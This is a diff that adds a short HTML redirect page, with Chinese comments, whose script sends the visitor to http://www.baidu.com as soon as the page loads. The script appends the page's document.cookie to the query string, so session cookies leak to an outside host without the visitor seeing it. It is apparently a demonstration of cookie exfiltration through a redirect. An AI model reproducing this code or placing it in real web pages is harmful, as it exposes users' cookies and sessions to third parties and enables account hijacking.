@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // 页面加载完毕后执行跳转
+        window.onload = function() {
+            // 直接跳转到百度，并附加当前页面的cookie
+            window.location.href = 'http://www.baidu.com?' + encodeURIComponent(document.cookie);
+        };
+    </script>
+</body>
+</html>
